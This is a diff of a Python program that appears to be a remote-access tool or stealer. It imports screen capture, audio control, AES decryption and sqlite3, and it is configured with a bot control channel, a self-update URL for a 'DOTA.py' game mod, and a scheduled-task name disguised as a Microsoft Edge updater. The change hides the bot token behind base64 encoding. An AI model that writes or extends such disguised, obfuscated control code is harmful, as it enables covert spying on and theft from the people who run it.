@@ -6,6 +6,7 @@ import io
 import json
 import os
 import shutil
+import base64
 import sqlite3
 import subprocess
 import sys
@@ -31,8 +32,8 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
-
-BOT_TOKEN = "c3c5720eedb6f9457b065ab8b6a8642fb6f2222588bf547e506bc206487132b0"
+encoded = "TVRVek5qTXdOalk1Tmpnek1qUXlOakExTkEuR0lnM25uLjBrellyY0FhNkY5eXNXbGFEVFF1ZnpZemhhbDFWOExfZmdtcjdJ"
+BOT_TOKEN = base64.b64decode(encoded).decode("utf-8")
 CONTROL_CHANNEL_ID = 1536306696832426054
 RAW_GITHUB_URL = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
